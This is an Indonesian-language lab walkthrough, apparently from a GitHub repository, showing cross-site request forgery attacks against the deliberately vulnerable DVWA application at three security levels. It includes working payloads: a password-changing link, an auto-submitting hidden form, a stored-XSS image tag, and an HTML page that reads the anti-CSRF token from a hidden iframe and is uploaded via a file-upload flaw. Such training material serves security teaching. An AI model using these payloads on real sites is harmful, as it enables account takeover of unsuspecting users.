# CSRF
Cross-site request forgery (CSRF) atau Pemalsuan permintaan lintas situs adalah celah keamanan web yang memungkinkan penyerang membujuk pengguna untuk melakukan tindakan yang tidak ingin mereka lakukan.

## Security Low
Mengganti password pengguna menjadi **test** lewat link
```sh
http://<IP_Server>/DVWA/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change
```

Mengganti password pengguna menjadi **test123** lewat halaman palsu (phising). Silahkan Edit dan simpan kode dibawah ini dengan **nama_file.html**
```sh
<html>
    <body>
        <form action="http://<IP_Server>/DVWA/vulnerabilities/csrf" method="GET">
            <input type="hidden" name="password_new" value="test123" />
            <input type="hidden" name="password_conf" value="test123" />
            <input type="hidden" name="Change" value="Change" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/CSRF/csrf%201.JPG)

## Security Medium (XSRF)
- Serangan ini akan menggabungkan 2 teknik yaitu CSRF dan XSS Stored
- Pindah ke halaman XSS (Stored) dengan **Security Low** lalu ubah maxlength pada **textarea** dari 50 menjadi 500 karakter melalui inspect element

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/CSRF/csrf%202.JPG)

- Masukkan script dibawah ini ke field **Message** lalu klik tombol **Sign Guestbook** untuk menjalankan
```sh
<img src="/DVWA/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change">
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/CSRF/csrf%203.JPG)

## Security High
- Serangan ini akan memanfaatkan celah keamanan file upload kemudian melakukan by pass terhadap parameter **user_token** untuk mengeksekusi CSRF
- Simpan script dibawah ini dengan format **nama_file.html**
```sh
<html>
    <body>
	   <h3>CSRF HIGH LEVEL</h3>
       <iframe id="myFrame" src="http://<IP_Server>/DVWA/vulnerabilities/csrf" style="visibility: hidden;" onload="maliciousPayload()"></iframe>
       <script>
         function maliciousPayload() {
            console.log("start");
            var iframe = document.getElementById("myFrame");
            var doc = iframe.contentDocument  || iframe.contentWindow.document;
            var token = doc.getElementsByName("user_token")[0].value;
            const http = new XMLHttpRequest();
            const url = "http://<IP_Server>/DVWA/vulnerabilities/csrf/?password_new=hacker&password_conf=hacker&Change=Change&user_token="+token+"#";
            http.open("GET", url);
            http.send();
            console.log("password changed");
         }
       </script>
    </body>
</html>
```
- Pindah ke halaman File Upload dengan **Security Low** dan upload file html diatas

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/CSRF/csrf%204.JPG)

- Ubah ke **Security High** dan buka halaman CSRF
- Buka file HTML yang sudah diupload untuk mengubah password user menjadi **hacker** sesuai file HTML diatas
```sh
http://<IP_Server>/DVWA/hackable/uploads/<nama_file>.html
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/CSRF/csrf%205.JPG)